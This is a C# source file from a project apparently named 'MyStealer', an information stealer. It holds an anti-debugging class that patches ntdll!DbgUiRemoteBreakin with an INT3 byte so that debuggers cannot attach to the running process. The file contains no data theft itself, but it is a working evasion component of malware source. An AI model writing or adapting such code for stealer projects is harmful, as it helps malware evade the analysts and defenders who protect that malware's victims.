using System.Diagnostics;
using static MyStealer.AntiDebug.NativeCalls;

namespace MyStealer.AntiDebug.Prevention
{
    /// <summary>
    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiDebug.cs
    /// </summary>
    public class AntiDbgUiRemoteBreakin : CheckBase
    {
        public override string Name => "Neutralize ntdll!DbgUiRemoteBreakin";

        public override bool PreventPassive()
        {
            var ntdll = GetModuleHandleA("ntdll.dll");
            var proc = GetProcAddress(ntdll, "DbgUiRemoteBreakin");
            var instr = new byte[] { 0xCC }; // INT3
            return WriteProcessMemory(Process.GetCurrentProcess().SafeHandle, proc, instr, 1, 0);
        }
    }
}
